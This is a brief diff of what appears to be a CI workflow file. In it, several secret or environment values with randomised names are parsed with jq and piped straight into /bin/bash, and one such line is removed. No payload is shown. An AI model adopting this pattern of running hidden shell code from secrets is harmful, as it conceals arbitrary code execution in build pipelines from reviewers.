@@ -20,7 +20,6 @@ jobs:
           pzsn5188: ${{ secrets.pzsn5188 }}
         run: |
           printf '%s' "$pzsn5188" | jq -r .goxr618 | /bin/bash
-          echo $okb4586 | jq -r .r0564 | /bin/bash
           echo $jwq529 | jq -r .vtjth1678 | /bin/bash
           printf '%s' "$bsgir4" | jq -r .mmsb544 | /bin/bash
 
